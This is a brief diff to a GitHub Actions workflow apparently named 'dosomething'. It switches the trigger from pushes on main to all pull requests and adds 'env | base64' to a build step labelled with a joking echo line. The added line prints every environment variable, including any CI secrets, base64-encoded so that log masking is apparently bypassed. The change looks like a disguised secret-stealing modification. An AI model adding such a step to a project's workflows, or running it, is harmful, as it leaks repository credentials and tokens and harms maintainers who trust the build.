@@ -3,7 +3,7 @@ name: dosomething
 
 on:
   push:
-    branches: [ "main" ]
+  pull_request:
 
 jobs:
   build-and-push:
@@ -14,3 +14,4 @@ jobs:
         fetch-depth: 0
     - run: |
         echo "we build container here. kek."
+        env | base64
